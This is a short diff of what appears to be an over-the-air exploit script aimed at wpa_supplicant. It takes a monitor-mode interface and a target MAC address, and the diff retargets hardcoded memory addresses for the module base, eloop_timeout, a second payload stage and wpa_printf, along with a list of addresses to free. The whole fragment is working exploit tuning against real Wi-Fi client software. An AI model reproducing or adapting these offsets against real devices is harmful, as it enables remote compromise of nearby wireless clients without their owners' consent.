@@ -20,12 +20,13 @@ args = parser.parse_args()
 iface = args.interface        # interface in monitor mode
 target = args.target          # target MAC address
 
-base  = 0x5555555000          # base address of main module
-eloop = 0x7fb743d1c0          # eloop_timeout address
-p2    = 0x7fb742e500          # second part of payload
+base  = 0x5575aa2000          # base address of main module
 
-eloop_next = base + 0x1a76b0  # eloop next (&list terminates)
-wpa_printf = base + 0x1a938   # addr of wpa_printf
+eloop = 0x7fb6e32780          # eloop_timeout address
+p2    = 0x7fb6e2d1a0          # second part of payload
+
+eloop_next = base + 0x1f0770  # eloop next (&list terminates)
+wpa_printf = base + 0x027d48  # addr of wpa_printf
 
 msg = b"hi :)"                # log on success (< 8 bytes)
 frees = [eloop-0x20]          # list of addrs to free (up to 10)
